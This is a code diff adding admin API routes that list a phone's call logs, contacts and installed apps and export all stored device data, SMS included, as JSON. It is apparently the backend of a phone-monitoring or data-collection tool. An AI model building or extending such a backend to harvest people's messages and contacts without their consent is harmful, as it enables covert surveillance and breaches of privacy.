@@ -286,6 +286,132 @@ router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
   }
 });
 
+// GET /api/admin/connections/:deviceId/call-logs — get call logs for a device
+router.get('/connections/:deviceId/call-logs', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 100;
+    const offset = (page - 1) * limit;
+
+    const total = db.prepare('SELECT COUNT(*) as count FROM call_logs WHERE device_id = ?').get(deviceId);
+    const logs = db.prepare(
+      'SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?'
+    ).all(deviceId, limit, offset);
+
+    res.json({
+      logs,
+      total: total ? total.count : 0,
+      page,
+      totalPages: Math.ceil((total ? total.count : 0) / limit),
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/contacts — get contacts for a device
+router.get('/connections/:deviceId/contacts', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 200;
+    const offset = (page - 1) * limit;
+
+    const total = db.prepare('SELECT COUNT(*) as count FROM contacts WHERE device_id = ?').get(deviceId);
+    const contacts = db.prepare(
+      'SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC LIMIT ? OFFSET ?'
+    ).all(deviceId, limit, offset);
+
+    // Parse JSON fields
+    const parsed = contacts.map(c => {
+      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
+      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
+      return c;
+    });
+
+    res.json({
+      contacts: parsed,
+      total: total ? total.count : 0,
+      page,
+      totalPages: Math.ceil((total ? total.count : 0) / limit),
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/apps — get installed apps for a device
+router.get('/connections/:deviceId/apps', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const showSystem = req.query.system === 'true';
+
+    let apps;
+    if (showSystem) {
+      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);
+    } else {
+      apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? AND is_system = 0 ORDER BY app_name ASC').all(deviceId);
+    }
+
+    const totalAll = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ?').get(deviceId);
+    const totalUser = db.prepare('SELECT COUNT(*) as count FROM installed_apps WHERE device_id = ? AND is_system = 0').get(deviceId);
+
+    res.json({
+      apps,
+      totalAll: totalAll ? totalAll.count : 0,
+      totalUser: totalUser ? totalUser.count : 0,
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// GET /api/admin/connections/:deviceId/export — export all device data as JSON
+router.get('/connections/:deviceId/export', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+
+    const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(deviceId);
+    if (!device) return res.status(404).json({ error: 'Device not found' });
+
+    try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }
+
+    const sms = db.prepare('SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC').all(deviceId);
+    const callLogs = db.prepare('SELECT * FROM call_logs WHERE device_id = ? ORDER BY date DESC').all(deviceId);
+    const contacts = db.prepare('SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC').all(deviceId);
+    const apps = db.prepare('SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC').all(deviceId);
+
+    // Parse JSON fields in contacts
+    const parsedContacts = contacts.map(c => {
+      try { c.phones = JSON.parse(c.phones || '[]'); } catch (_) { c.phones = []; }
+      try { c.emails = JSON.parse(c.emails || '[]'); } catch (_) { c.emails = []; }
+      return c;
+    });
+
+    const exportData = {
+      exported_at: new Date().toISOString(),
+      device,
+      sms_messages: sms,
+      call_logs: callLogs,
+      contacts: parsedContacts,
+      installed_apps: apps,
+      summary: {
+        total_sms: sms.length,
+        total_calls: callLogs.length,
+        total_contacts: contacts.length,
+        total_apps: apps.length,
+      },
+    };
+
+    res.setHeader('Content-Disposition', `attachment; filename="device_${deviceId.substring(0, 8)}_export.json"`);
+    res.setHeader('Content-Type', 'application/json');
+    res.json(exportData);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 // POST /api/admin/login
 router.post('/login', (req, res) => {
   try {
